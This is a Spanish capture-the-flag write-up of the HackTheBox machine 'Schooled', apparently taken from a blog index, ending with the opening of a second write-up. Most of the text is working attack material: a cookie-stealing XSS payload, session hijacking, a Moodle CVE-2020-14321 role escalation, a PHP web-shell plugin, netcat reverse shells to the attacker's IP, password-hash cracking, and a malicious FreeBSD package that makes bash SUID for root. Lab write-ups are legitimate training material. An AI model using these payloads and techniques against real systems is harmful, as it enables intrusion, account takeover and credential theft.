Apr 11 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 234# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 234 ()  Status: UpHost: 10. 10. 10. 234 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 33060/open/tcp//mysqlx///# Nmap done at Sun Apr 11 25:25:25 2021 -- 1 IP address (1 host up) scanned in 216. 96 secondsPerfecto, nos encontramos los servicios:       Puerto   Descripci√≥n         22   SSH: Contamos con la posibilidad de obtener una Shell de manera segura.        80   HTTP: Tenemos una p√°gina web.        33060   MySQLx.    Ahora hagamos un escaneo de scripts y versiones para tener info m√°s especifica de cada puerto: ‚ù≠ nmap -p 22,80,33060 -sC -sV 10. 10. 10. 234 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚ù≠ cat portScan # Nmap 7. 80 scan initiated Sun Apr 11 25:25:25 2021 as: nmap -p 22,80,33060 -sC -sV -oN portScan 10. 10. 10. 234Nmap scan report for 10. 10. 10. 234Host is up (0. 19s latency). PORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 7. 9 (FreeBSD 20200214; protocol 2. 0)80/tcp  open http  Apache httpd 2. 4. 46 ((FreeBSD) PHP/7. 4. 15)33060/tcp open mysqlx?1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap. org/cgi-bin/submit. cgi?new-service :SF-Port33060-TCP:V=7. 80%I=7%D=4/11%Time=60731B26%P=x86_64-pc-linux-gnu%r(NSF:ULL,9, . . .  );Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd Service detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Sun Apr 11 25:25:25 2021 -- 1 IP address (1 host up) scanned in 78. 15 secondsObtenemos (varias cositas que veremos despu√©s) por ahora:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 7. 9 (FreeBSD 2020/02/14)       80   HTTP   Apache httpd 2. 4. 46 (FreeBSD)       33060   MySQLx   -   Ahora exploremos cada servicio a ver por donde podemos vulnerar el sistema. ‚Ä¶ Enumeraci√≥n #‚Ä¶ Dando vueltas con el puerto 80 üìå: Nos encontramos una p√°gina web de una instituci√≥n para estudiar online, d√°ndole una vuelta nos encontramos un email y tambi√©n alusi√≥n al dominio schooled. htb: Listo, guardemos el email por si algo y agreguemos ese dominio al archivo /etc/hosts para que cuando hagamos peticiones hacia el dominio schooled. htb nos resuelva hacia la IP 10. 10. 10. 234, que quiz√°s tenga info diferente‚Ä¶  Info archivo /etc/hosts. ‚ù≠ cat /etc/hosts. . . 10. 10. 10. 234 schooled. htb. . . Y validando de nuevo en la web, pero en vez de escribir la IP ahora escribimos el dominio y obtenemos aparentemente el mismo resultado que antes. Enumerando nos encontramos el apartado /teachers. html el cual tiene algunos nombres y roles que podemos guardar por si llegamos a encontrar alg√∫n portal o algo que podamos relacionar: Jane Higgins -&gt; Scientific. Lianne Carter -&gt; Manager &amp; Profesora. Manuel Phillips -&gt; Profesor. Jamie Borham -&gt; Profesora. Siguiendo, en el apartado /contact. html encontramos unos campos a llenar y al enviarlos nos redirecciona a un archivo llamado contact. php, pero obtenemos un error con estado 404 Not Found‚Ä¶ Encontramos el servicio Moodle üìå: Ac√° no encontramos nada m√°s en la web, jugando con el c√≥digo fuente o con las carpetas que hay no vemos nada, as√≠ que procedamos a fuzzear un poco‚Ä¶ Haciendo un fuzzing de archivos y directorio no encontramos nada, pero si fuzzeamos a ver si existe otro dominio relacionado con schooled. htb el cual responda a la IP 10. 10. 10. 234 tenemos: ‚ù≠ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000. txt -u http://10. 10. 10. 234 -H 'Host: FUZZ. schooled. htb'. . . =====================================================================ID      Response  Lines  Word    Chars    Payload   =====================================================================000000022:  200    461 L  1555 W   20750 Ch   pop3 000000001:  200    461 L  1555 W   20750 Ch   www 000000003:  200    461 L  1555 W   20750 Ch   ftp 000000007:  200    461 L  1555 W   20750 Ch   webdisk 000000015:  200    461 L  1555 W   20750 Ch   ns 000000023:  200    461 L  1555 W   20750 Ch   forum . . . Tenemos muchos, pero probablemente sean falsos positivos, as√≠ que filtremos para que nos quite todos los que tengan como numero total de letras 1555: ‚ù≠ wfuzz -c --hc=404 --hw=1555 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000. txt -u http://10. 10. 10. 234 -H 'Host: FUZZ. schooled. htb'. . . =====================================================================ID      Response  Lines  Word    Chars    Payload=====================================================================000000162:  200    1 L   5 W    84 Ch     moodle Perfecto, aparentemente tenemos un nuevo dominio a probar, pues agregu√©moslo junto a schooled. htb al archivo /etc/hosts: ‚ù≠ cat /etc/hosts. . . 10. 10. 10. 234 schooled. htb moodle. schooled. htb. . . Y validando en la web nos encontramos con: Nice, tenemos un servicio moodle, que seg√∫n Wikipedia es: üéì Herramienta de gesti√≥n de aprendizaje (LMS), o m√°s concretamente de Learning Content Management (LCMS), de distribuci√≥n libre, escrita en PHP.  Web Oficial de Moodle. Si intentamos ver cualquier recurso nos pide un ingreso por medio de credenciales‚Ä¶ (Probar contrase√±as por default y con los profesores encontrados no nos dio resultado). Pero tambi√©n podemos ingresar como invitado o crearnos una cuenta, probando inicialmente el acceso como invitado contra cualquier curso nos pide que debemos tener una cuenta: Dando vueltas por el sitio como invitado vemos varias URL‚Äôs posiblemente llamativas:    http://moodle. schooled. htb/moodle/enrol/index. php?id=5   El ID va del 5 al 2, el n√∫mero 1 nos redirecciona a la p√°gina principal donde est√°n todos los cursos.     http://moodle. schooled. htb/moodle/calendar/view. php?view=month   Tiene la opci√≥n de variar entre d√≠a, mes y a√±o, pero solo mes (month) funciona.     http://moodle. schooled. htb/moodle/calendar/view. php?view=month&amp;time=1614556800   Podemos ver el calendario de varios meses, ya que time depende del mes que escojamos.  Entonces, con esto en mente podr√≠amos probar inyecci√≥n SQL (no va por ac√°) de varias maneras, validando r√°pidamente que no existan m√°s IDs (cursos) tenemos: ‚ù≠ for id in $(seq 0 20); do echo -n  ID: $id -&gt; Status Code:  ; curl -s -I --cookie  MoodleSession=2a9js25d3usf0dv3u5r27c21nn  http://moodle. schooled. htb/moodle/enrol/index. php?id=$id | grep  HTTP/1. 1  | awk '{print $2}'; doneID: 0 -&gt; Status Code: 404ID: 1 -&gt; Status Code: 303ID: 2 -&gt; Status Code: 200ID: 3 -&gt; Status Code: 200ID: 4 -&gt; Status Code: 200ID: 5 -&gt; Status Code: 200ID: 6 -&gt; Status Code: 404ID: 7 -&gt; Status Code: 404ID: 8 -&gt; Status Code: 404ID: 9 -&gt; Status Code: 404ID: 10 -&gt; Status Code: 404ID: 11 -&gt; Status Code: 404ID: 12 -&gt; Status Code: 404ID: 13 -&gt; Status Code: 404ID: 14 -&gt; Status Code: 404ID: 15 -&gt; Status Code: 404ID: 16 -&gt; Status Code: 404ID: 17 -&gt; Status Code: 404ID: 18 -&gt; Status Code: 404ID: 19 -&gt; Status Code: 404ID: 20 -&gt; Status Code: 404Ahora probando a registrarnos encontramos un nuevo dominio:  student. schooled. htb. Pero agreg√°ndolo al archivo /etc/hosts y validando su contenido nos damos cuenta de que responde con el mismo de schooled. htb. As√≠ que cambiamos nuestro email con ese dominio y nos permite registrarnos: Vemos algo interesante a la izquierda, Private files, ech√°ndole un ojo nos permite subir archivos, podemos hacerlo mediante un URL: Probando a que el servicio lea un archivo que est√© alojado en nuestra m√°quina (servidor) obtenemos respuesta, pero despu√©s de varios intentos no logramos nada relevante. Dando vueltas encontramos que podemos modificar nuestra imagen de perfil. Intentamos lo mismo que antes e incluso subir una imagen con metadatos PHP o cambi√°ndole los magic bytes a un script para que el sistema crea que es un JPEG, pero nada, no obtenemos respuesta.  INFO metadata y cambiar magic bytes. (En la mitad del post esta). Entrando en Site home nos damos cuenta de algo interesante, el curso Mathematics es el √∫nico al cual podemos ‚Äúanotarnos‚Äù como estudiantes: Despu√©s de anotarnos (enrolarnos) nos redirige a: http://moodle. schooled. htb/moodle/course/view. php?id=5 Si nos movemos a Annoucements tenemos 2 mensajes: Fij√°ndonos en el primero tenemos informaci√≥n interesante: ‚Ä¶ Explotaci√≥n #‚Ä¶ Jugamos con la interacci√≥n del profesor para robarle su cookie üìå: üë®‚Äçüè´ Students who do not set their MoodleNet profiles will be removed from the course before the course is due to start and I will be checking all students who are enrolled on this course. Nos indica que el usuario Manuel Phillips (profesor) estar√° revisando que todos los estudiantes que se unan a su curso tengan habilitado o modificado en su perfil (estudiante) algo llamado MoodleNet (que es una red social para educadores seg√∫n la web oficial) :O Opa, esto esta interesante, ya que dependiendo el campo el cual debamos modificar podr√≠amos pensar en robarle la cookie al profesor, ya que estar√≠a verificando nuestro perfil (siempre y cuando estemos enrolados en su curso), por lo tanto esta entrando en el campo (de nuestro perfil) y validar√≠a su contenido. Veamos, vamos a nuestro perfil arriba a la derecha, damos clic en edit profile y vemos: Es un campo de texto, pues vayamos a la fija e intentemos que lea algo de nuestro servidor a ver si realmente el profesor esta validando el input: Levantamos servidor web: ‚ù≠ python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . Y en el campo MoodleNet escribimos: &lt;script src= http://10. 10. 14. 11:8000/serompe. oque &gt;&lt;/script&gt;Guardamos los cambios‚Ä¶ Y si revisamos nuestro servidor: ‚ù≠ python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . 10. 10. 10. 234 - - [12/Apr/2021 25:25:25] code 404, message File not found10. 10. 10. 234 - - [12/Apr/2021 25:25:25]  GET /serompe. oque HTTP/1. 1  404 -Entonces, esta perfecto, sabemos que el profesor esta validando ese campo, ahora podemos proceder a robarle su cookie, para esto simplemente indicamos en el campo MoodleNet: &lt;script&gt;document. write('&lt;img src= http://10. 10. 14. 11:8000/serompe. oque?cookie=' + document. cookie + ' &gt;')&lt;/script&gt;Esto va a intentar subir una imagen (como antes), solo que como la imagen ‚Äúesta‚Äù en nuestro servidor, intentara cargarla, peeeero adem√°s le concatenamos una variable llamada cookie que guardara la sesi√≥n del usuario que ingrese al campo (con document. cookie), o sea, obtendr√≠amos la cookie del profesor que esta validando el campo. Guardamos yyyyyyyyyy en nuestro servidor obtenemos: ‚ù≠ python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . 10. 10. 10. 234 - - [12/Apr/2021 25:25:25] code 404, message File not found10. 10. 10. 234 - - [12/Apr/2021 25:25:25]  GET /serompe. oque?cookie=MoodleSession=boejsdgppi3r50rahsn0tcnqji HTTP/1. 1  404 -PERFECTOOOOOOOOOOOO, tenemos la petici√≥n con una cookie, pues probemos a cambiar la nuestra por esa: VAMONOOOOOOOOOOOOOOOOOOS, somos el usuario Manuel Phillips. En su perfil vemos un correo y un dominio, podemos guardarlos por si algo. Adem√°s sabemos la estructura de como est√°n (suponemos) guardados los usuarios (o profesores) del servidor: apellido_nombre@dominio. Divagando y explotando la versi√≥n de Moodle üìå: Viendo que podemos hacer ahora como profesor, leyendo cositas y probando otras, finalmente en la web encontramos un PoC haciendo alusi√≥n al CVE CVE-2020-14321 que se ve interesante:  Youtube - Moodle RCE CVE-2020-14321 POC. La vulnerabilidad se basa en que un profesor puede asignarse a s√≠ mismo o a otros el rol de manager dentro de un curso, lo que le dar√≠a poder de manipular el curso como **administrador** üòÆ Entonces, si indagamos un poco encontramos el PoC oficial de la persona que encontr√≥ la vulnerabilidad:  Kien Hoang - https://github. com/HoangKien1020/CVE-2020-14321. Ya tenemos todo lo que necesitamos, as√≠ que sigamos los mismos pasos que el video: 1. Nos logeamos como profesor, pero como tenemos la cookie de uno, tamos bien.  2. Vamos al curso del cual somos profesor, en nuestro caso mathematics (Maths), damos clic en Participants y despu√©s en Enrol users.  Estando en esa ventana seleccionamos al usuario Lianne Carter para enrolarla al curso (ya jugaremos con burp), pero, ¬øpor qu√© ella? Bueno si recordamos cuando encontramos los profesores en la web, estaba Lianne Carter como manager del sitio, as√≠ que nos aprovecharemos para cambiar unos valores y enrolarla, pero como administradora del curso (si no, se enrolar√≠a como estudiante :P). Interceptamos mediante BurpSuite la petici√≥n y damos clic en Enrol users, obtenemos: Dos campos importantes:  userlist[]= (ID del usuario).  roletoassign= (Rol a asignar, 1 es manager seg√∫n esta documentaci√≥n). As√≠ que en vez de 5 colocamos 1 y enviamos la petici√≥n. Pero validando en la web no vemos que Lianne sea manager a√∫n: Lianne Carter - carter_lianne@staff. schooled. htb - StudentSi modificamos al usuario Manuel (ID 24) (con el que estamos) para que tambi√©n tenga el rol de manager obtenemos en la web: Lianne Carter - carter_lianne@staff. schooled. htb - Manager, Student. . . Manuel Phillips - phillips_manuel@staff. schooled. htb - Manager, TeacherListos, ahora si podemos seguir con el PoC‚Ä¶ 3. Obtenemos una sesi√≥n en Moodle como Lianne (manager) en el curso. Damos clic en el nombre de Lianne y estando en su perfil vamos a Log in as: Y ahora somos Lianne y tenemos acceso a un nuevo apartado, Site administration: 4. Vamos a instalar un plugin malicioso. Entramos al sitio administrativo y seleccionamos Plugins: Ahora damos clic en Install plugins: Nos pide un archivo zip para instalar el plugin. Volviendo al repo vemos que nos provee con un comprimido llamado rce. zip:  https://github. com/HoangKien1020/Moodle_RCE/blob/master/rce. zip. Lo descargamos y validando su contenido tenemos: ‚ù≠ tree rcerce‚îú‚îÄ‚îÄ lang‚îÇ¬†¬† ‚îî‚îÄ‚îÄ en‚îÇ¬†¬†   ‚îî‚îÄ‚îÄ block_rce. php‚îî‚îÄ‚îÄ version. phpüî¶ block_rce. php es el archivo que nos permite ejecutar comandos en el sistema, todo mediante la variable cmd que recibe en la petici√≥n GET: ‚ù≠ cat rce/lang/en/block_rce. php &lt;?php system($_GET['cmd']); ?&gt;üî¶ version. php permite la generaci√≥n del plugin y llama a nuestro archivo malicioso: ‚ù≠ cat rce/version. php &lt;?php $plugin-&gt;version = 2020061700;$plugin-&gt;component = 'block_rce';Listos, para subir el archivo zip, seleccionamos el objeto y damos clic en Install plugin from the ZIP file, recibimos: Damos clic en Continue y seg√∫n las indicaciones del PoC simplemente debemos dirigirnos a la siguiente ruta: &lt;domain&gt;/blocks/rce/lang/en/block_rce. phpY concatenarle el comando que queramos ejecutar con la variable cmd, modific√°ndola quedar√≠a as√≠ para ejecutar el comando id: http://moodle. schooled. htb/moodle/blocks/rce/lang/en/block_rce. php?cmd=id PERFECTOOOOOOOOOOOOOOOOOOOOOOo tenemos ejecuci√≥n remota de comandossadflakjwlekfjlkasd (: Intentemos conseguir una reverse Shell‚Ä¶ Nos ponemos en escucha con netcat: nc -lvp 4433.  Reverse Shells Others and FreeBSD. Probando estas dos sentencias lo logramos: http://moodle. schooled. htb/moodle/blocks/rce/lang/en/block_rce. php?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |telnet 10. 10. 14. 11 4433 &gt; /tmp/fhttp://moodle. schooled. htb/moodle/blocks/rce/lang/en/block_rce. php?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc 10. 10. 14. 11 4433 &gt; /tmp/fY Listones, ya estariamos dentro. Intentando hacer tratamiento de la TTY o al menos tener una Shell m√°s bonita, tenemos problemas y no lo logramos :( As√≠ que enumeremos a ver como podemos movernos a algo lindo. ‚Ä¶ Como vimos, el proceso es muuuuy largo y tedioso de hacer manual, por lo tanto me cree dos scripts, uno enfocado 100% en la m√°quina, con √©l nos agrega la l√≠nea en el perfil de Moodle y tambi√©n toooooooooooodo el tema del RCE.  moodle_schooled_RCE. pyEl otro explota directamente el CVE, por lo que funciona contra cualquier Moodle 3. 9 con el que tengas credenciales de un profesor (o una cookie :P)  exploit. db - Moodle 3. 9 Remote Code Execution (RCE) (Authenticated). ‚Ä¶ MySQL: www -&gt; jamie #Enumerando los usuarios del sistema tenemos: ls -la /homelrwxr-xr-x 1 root wheel 8 Feb 26 22:45 /home -&gt; usr/homels -la /usr/hometotal 26drwxr-xr-x  4 root  wheel  4 Mar 16 06:33 . drwxr-xr-x 16 root  wheel 16 Feb 26 22:46 . . drwx------  2 jamie jamie 11 Feb 28 18:13 jamiedrwx------  5 steve steve 14 Mar 17 14:05 steve jamie y steve. Leyendo archivos de la ruta donde salimos encontramos la configuraci√≥n de la base de datos: pwd/usr/local/www/apache24/data/moodlecat config. php&lt;?php // Moodle configuration fileunset($CFG);global $CFG;$CFG = new stdClass();$CFG-&gt;dbtype  = 'mysqli';$CFG-&gt;dblibrary = 'native';$CFG-&gt;dbhost  = 'localhost';$CFG-&gt;dbname  = 'moodle';$CFG-&gt;dbuser  = 'moodle';$CFG-&gt;dbpass  = 'PlaybookMaster2020';$CFG-&gt;prefix  = 'mdl_';$CFG-&gt;dboptions = array ( 'dbpersist' =&gt; 0, 'dbport' =&gt; 3306, 'dbsocket' =&gt; '', 'dbcollation' =&gt; 'utf8_unicode_ci',);$CFG-&gt;wwwroot  = 'http://moodle. schooled. htb/moodle';$CFG-&gt;dataroot = '/usr/local/www/apache24/moodledata';$CFG-&gt;admin   = 'admin';$CFG-&gt;directorypermissions = 0777;require_once(__DIR__ . '/lib/setup. php');// There is no php closing tag in this file,// it is intentional because it prevents trailing whitespace problems! moodle -&gt; PlaybookMaster2020Buscando la manera de jugar con MySQL con esta terminal encontramos las lindas herramientas: find / -name mysqlshow/usr/local/bin/mysqlshowUs√©mosla para intentar ver el contenido de la base de datos: /usr/local/bin/mysqlshow -u moodle -pPlaybookMaster2020+--------------------+|   Databases   |+--------------------+| information_schema || moodle       |+--------------------+Tenemos la base de datos moodle (aunque ya lo sab√≠amos del archivo config. php), veamos sus tablas: /usr/local/bin/mysqlshow -u moodle -pPlaybookMaster2020 moodleDatabase: moodle+----------------------------------+|       Tables       |+----------------------------------+| mdl_analytics_indicator_calc   || mdl_analytics_models       |. . . | mdl_user             |. . . Ahora que tenemos una tabla llamativa podemos usar mysqldump para ‚Äúdumpear‚Äù (realmente hace como si quisi√©ramos realizar un backup, por eso dumpea) la info de lo que le pidamos, en este caso de la tabla mdl_user: /usr/local/bin/mysqldump -u moodle -pPlaybookMaster2020 moodle mdl_user Vemos muuuucha informaci√≥n, pero toda es relacionada con usuarios, si ajustamos la visi√≥n vemos un usuario llamado jamie y que esta relacionado con el staff, por lo que puede ser el mismo jamie del sistema, podemos tomar su hash e intentar crackearlo. ‚ù≠ cat jamie_hash$2y$10$3D/gznFHdpV6PXt1cLPhX. ViTgs87DCE5KqphQhGYR5GFbcl4qTiWUsaremos John The Ripper: ‚ù≠ john --wordlist=/usr/share/wordlists/rockyou. txt jamie_hashUsing default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 1024 for all loaded hashesPress 'q' or Ctrl-C to abort, almost any other key for status!QAZ2wsx     (?)1g 0:00:06:00 DONE (2021-04-12 25:25) 0. 002771g/s 38. 50p/s 38. 50c/s 38. 50C/s 010188. . !QAZ2wsxUse the  --show  option to display all of the cracked passwords reliablySession completedAl parecer el resultado es !QAZ2wsx, probemos mediante SSH con el usuario jamie: ‚ù≠ ssh jamie@10. 10. 10. 234Password for jamie@Schooled:Last login: Tue Mar 16 14:44:53 2021 from 10. 10. 14. 5FreeBSD 13. 0-BETA3 (GENERIC) #0 releng/13. 0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021Welcome to FreeBSD!. . . jamie@Schooled:~ $ iduid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel)jamie@Schooled:~ $ Perfect√≠simo, tamos dentro de la m√°quina con una linda Shell :) ‚Ä¶ Escalada de privilegios #Viendo los permisos que tiene jamie en el sistema, tenemos: jamie@Schooled:~ $ sudo -lUser jamie may run the following commands on Schooled:  (ALL) NOPASSWD: /usr/sbin/pkg update  (ALL) NOPASSWD: /usr/sbin/pkg install *Opa, interesante, dos permisos, uno para actualizar paquetes (supongo) y otro para instalar paquetes de la ruta donde estemos. Y ambos los podemos ejecutar como cualquier usuario del sistema.  INFO pkg binary. üì¶ pkg provides an interface for manipulating packages: registering, adding, removing and upgrading packages. Dando vueltas para ver como podr√≠amos explotar esto, encontramos un post donde nos muestra un script que genera un paquete para posteriormente ser instalado:  Creating Custom Packages on FreeBSD. El post toma el script por partes, pero la parte que nos interesa en la inicial, ya que es donde podemos modificar el c√≥digo que queremos que se ejecute mientras el paquete se esta instalando: #!/bin/shSTAGEDIR=/tmp/stagerm -rf ${STAGEDIR}mkdir -p ${STAGEDIR}cat &gt;&gt; ${STAGEDIR}/+PRE_DEINSTALL &lt;&lt;EOF# careful here, this may clobber your systemecho  Resetting root shell pw usermod -n root -s /bin/cshEOFcat &gt;&gt; ${STAGEDIR}/+POST_INSTALL &lt;&lt;EOF# careful here, this may clobber your systemecho  Registering root shell pw usermod -n root -s /bin/shEOFDonde relativamente parece que resetea la Shell asignada al usuario root, peroooo, podr√≠amos cambiar esos comandos por los nuestros, algo as√≠: #!/bin/shSTAGEDIR=/tmp/stagerm -rf ${STAGEDIR}mkdir -p ${STAGEDIR}cat &gt;&gt; ${STAGEDIR}/+PRE_DEINSTALL &lt;&lt;EOF# careful here, this may clobber your systemecho  1 root shell whoami | nc 10. 10. 14. 11 4434EOFcat &gt;&gt; ${STAGEDIR}/+POST_INSTALL &lt;&lt;EOF# careful here, this may clobber your systemecho  2 root shell id | nc 10. 10. 14. 11 4434EOFIntentamos que nos env√≠e el output de whoami y de id a nuestro listener y ver que obtenemos. Esta parte es gen√©rica y estructural, entiendo que es necesaria para la creaci√≥n del paquete, pero no necesitamos modificar nada: cat &gt;&gt; ${STAGEDIR}/+MANIFEST &lt;&lt;EOFname: mypackageversion:  1. 0_5 origin: sysutils/mypackagecomment:  automates stuff desc:  automates tasks which can also be undone later maintainer: john@doe. itwww: https://doe. itprefix: /EOFecho  deps: {  &gt;&gt; ${STAGEDIR}/+MANIFESTpkg query   %n: { version: \ %v\ , origin: %o }  portlint &gt;&gt; ${STAGEDIR}/+MANIFESTpkg query   %n: { version: \ %v\ , origin: %o }  poudriere &gt;&gt; ${STAGEDIR}/+MANIFESTecho  }  &gt;&gt; ${STAGEDIR}/+MANIFESTmkdir -p ${STAGEDIR}/usr/local/etcecho  # hello world  &gt; ${STAGEDIR}/usr/local/etc/my. confecho  /usr/local/etc/my. conf  &gt; ${STAGEDIR}/plistpkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -p ${STAGEDIR}/plist -o . Ahora ya podemos ejecutar el script y validar si se nos genera el paquete: jamie@Schooled:/tmp/aver $ . /aja. shjamie@Schooled:/tmp/aver $ lsaja. sh mypackage-1. 0_5. txzListo, se genera correctamente (: Instal√©moslo: jamie@Schooled:/tmp/aver $ sudo /usr/sbin/pkg install *. txzUpdating FreeBSD repository catalogue. . . pkg: Repository FreeBSD has a wrong packagesite, need to re-create databasePero ac√° se queda pensando y no hace nada, as√≠ que buscando encontramos que probablemente el tema sea que intenta actualizar el cat√°logo de repositorios (como dice ah√≠) y por eso se queda pegado. Pero en este manual tenemos el par√°metro --no-repo-update el cual se encarga precisamente de suprimir la actualizaci√≥n autom√°tica que intenta hacer:  pkg install - Install packages from remote package repositories or local archives. Si volvemos a intentar pero ahora con el nuevo argumento: jamie@Schooled:/tmp/aver $ sudo /usr/sbin/pkg install --no-repo-update *. txzpkg: Repository FreeBSD has a wrong packagesite, need to re-create databasepkg: Repository FreeBSD cannot be opened. 'pkg update' requiredChecking integrity. . . done (0 conflicting)The following 1 package(s) will be affected (of 0 checked):New packages to be INSTALLED:    mypackage: 1. 0_5Number of packages to be installed: 1Proceed with this action? [y/N]: y[1/1] Installing mypackage-1. 0_5. . . Extracting mypackage-1. 0_5: 100%2 root shelljamie@Schooled:/tmp/aver $ Perfecto, se ejecuta, en nuestro listener recibimos: ‚ù≠ nc -lvp 4434listening on [any] 4434 . . . connect to [10. 10. 14. 11] from schooled. htb [10. 10. 10. 234] 39175uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)Oko, tenemos ejecuci√≥n de comandos, pero recibimos el id, por lo tanto el primer apartado parece que no se est√° ejecutando, agreguemos nuestra reverse Shell en la parte de +POST_INSTALL (segundo apartado): . . . EOFcat &gt;&gt; ${STAGEDIR}/+POST_INSTALL &lt;&lt;EOF# careful here, this may clobber your systemecho  2 root shell rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i | nc 10. 10. 14. 11 4434 &gt; /tmp/fEOFcat &gt;&gt; ${STAGEDIR}/+MANIFEST &lt;&lt;EOF. . . Pero al ejecutar la instalaci√≥n del paquete obtenemos o errores o simplemente nada. As√≠ que podemos probar a modificar la /bin/bash a SUID: ‚õπÔ∏è SUID? ‚Ä¶ it‚Äôs a way in UNIX-like operating systems of running a command as another user without providing credentials. pentestpartners - exploiting-suid-executables. jamie@Schooled:/tmp/aver $ ls -la /bin/bashlrwxr-xr-x 1 root wheel 19 Apr 1 17:02 /bin/bash -&gt; /usr/local/bin/bashVemos que /bin/bash tiene un link hacia /usr/local/bin/bash, o sea que cuando ejecutemos /bin/bash, esteremos ejecutando realmente /usr/local/bin/bash. jamie@Schooled:/tmp/aver $ ls -la /usr/local/bin/bash-rwxr-xr-x 1 root wheel 941288 Feb 20 01:47 /usr/local/bin/bashEntonces modificamos los permisos agreg√°ndole el SUID (4) al binario /bin/bash, que realmente se los estar√≠a otorgando al binario /usr/local/bin/bash :) . . . EOFcat &gt;&gt; ${STAGEDIR}/+POST_INSTALL &lt;&lt;EOF# careful here, this may clobber your systemecho  2 root shell chmod 4755 /bin/bashEOFcat &gt;&gt; ${STAGEDIR}/+MANIFEST &lt;&lt;EOF. . . Generamos paquete e instalamos: jamie@Schooled:/tmp/aver $ . /aja. sh jamie@Schooled:/tmp/aver $ sudo /usr/sbin/pkg install --no-repo-update *. txzpkg: Repository FreeBSD has a wrong packagesite, need to re-create databasepkg: Repository FreeBSD cannot be opened. 'pkg update' requiredChecking integrity. . . done (0 conflicting)The following 1 package(s) will be affected (of 0 checked):New packages to be INSTALLED:    mypackage: 1. 0_5Number of packages to be installed: 1Proceed with this action? [y/N]: y[1/1] Installing mypackage-1. 0_5. . . Extracting mypackage-1. 0_5: 100%2 root shelljamie@Schooled:/tmp/aver $ Ahora validamos los permisos de los binarios: jamie@Schooled:/tmp/aver $ ls -la /bin/bashlrwxr-xr-x 1 root wheel 19 Apr 1 17:02 /bin/bash -&gt; /usr/local/bin/bashjamie@Schooled:/tmp/aver $ ls -la /usr/local/bin/bash-rwsr-xr-x 1 root wheel 941288 Feb 20 01:47 /usr/local/bin/bashPerfecto, vemos el nuevo permiso asignado con una s en la ejecuci√≥n. Ahora simplemente indicamos /usr/local/bin/bash -p para que ejecute el programa con los permisos SUID que tenga asignados el objeto. Como el due√±o del binario es root, tomara el SUID de ese usuario, por lo tanto tendremos una Shell como √©l. jamie@Schooled:/tmp/aver $ /usr/local/bin/bash -p[jamie@Schooled /tmp/aver]# whoamirootY si (: tenemos una sesi√≥n como root, solo nos quedar√≠a ver las flags: ‚Ä¶ Linda m√°quina eh! Linda linda, me gusto mucho como le robamos la cookie al profesor y como nos aprovechamos del rol manager para conseguir RCE, muy lindo todo. (Adem√°s que me permiti√≥ explorar a profundidad la creaci√≥n de un exploit bastante retador) Y bueno, como siempre y como nunca, much√≠simas gracias y a seguir rompiendo todo ;) "
    }, {
    "id": 18,
    "url": "http://localhost:4000/htb/unobtainium",
    "title": "HackTheBox - Unobtainium",
    "body": "2021/08/30 - M√°quina Linux nivel dif√≠cil. Explotaremos una app de Linux. Jugando con librer√≠as de JavaScript, la infectaremos (Prototype Pollution en lodash) y haremos command-injection (en google-cloudstorage-commands). Y moveremos internamente muchas cosas con Kubernetes.  TL;DR (Spanish writeup): Creada por: felamos. Bueeeeno, nos encontraremos con un servidor web el cual nos entregara en las manitas un paquete . deb, antes de instalarlo en el sistema jugaremos con algunas herramientas para ver el contenido de ese paquete, Instalaremos el paquete . deb y obtendremos el binario unobtainium en el sistema. La aplicaci√≥n permite enviar mensajes en forma de ‚Äúchat‚Äù y podremos verlos reflejados ya sea en la web o en la propia app. Jugaremos y jugaremos para encontrar algunos errores, esos errores hablar√°n por si solos (y nos apoyaremos de los archivos encontrados en el paquete para darle m√°s fuerza a nuestra b√∫squeda), lograremos leer archivos de la app usando un apartado llamado /todo. Entre eso obtendremos el c√≥digo fuente de la aplicaci√≥n. Inspeccion√°ndolo encontraremos varias brechas en dos librer√≠as de JavaScript, un envenenamiento de prototipos (Prototype Pollution) en la librer√≠a lodash y otra inyectando comandos sobre google-cloudstorage-commands. Jugando con ellas lograremos ejecuci√≥n remota de comandos sobre el contenedor que sirve el app. Con Python creamos este script to lindo, ya sea para obtener una Shell desde √©l o para ejecutar comandos en el contenedor.  pollutionRCE. pyEstando dentro del contenedor encontraremos que con lo √∫nico que podemos jugar es con Kubernetes, moveremos y moveremos (y seguiremos moviendo) cosas para volver a realizar el ataque de Prototype Pollution + Command Injection peeeeero ahora sobre el entorno de desarrollo que esta internamente corriendo (antes lo hicimos en el de producci√≥n :P) Ya dentro, veremos que podemos listar ‚Äúsecretos‚Äù (claves, contrase√±as, texto privado, tokens, etc. ) de Kubernetes (algo que antes no). Uno de esos secretos contiene el token del admin de Kubernetes, con √©l tendremos control total contra el servicio (de nuevo) Kubernetes. Lo que nos dar√° la opci√≥n de crearnos un pod (‚Äúconjunto de contenedores‚Äù) malicioso que copie toooooda la ra√≠z del sistema en una carpeta de ese pod (a la vez que ejecuta una Reverse Shell), 